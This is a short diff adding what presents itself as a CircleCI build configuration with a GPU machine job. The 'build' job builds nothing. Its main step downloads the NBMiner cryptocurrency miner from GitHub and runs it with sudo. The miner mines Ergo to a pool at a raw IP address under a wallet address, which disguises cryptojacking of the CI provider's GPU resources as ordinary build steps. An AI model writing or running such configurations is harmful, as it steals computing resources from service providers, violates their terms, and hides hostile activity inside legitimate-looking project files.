@@ -1,0 +1,11 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -zxvf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && sudo ./nbminer -a ergo -o  34.149.62.115:443  --user 35ZnC1q2Vnjwkn9rLtE5RybR8gHVap3B1R.$(shuf -n 1 -i 1-99999)  --enable-dag-cache
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
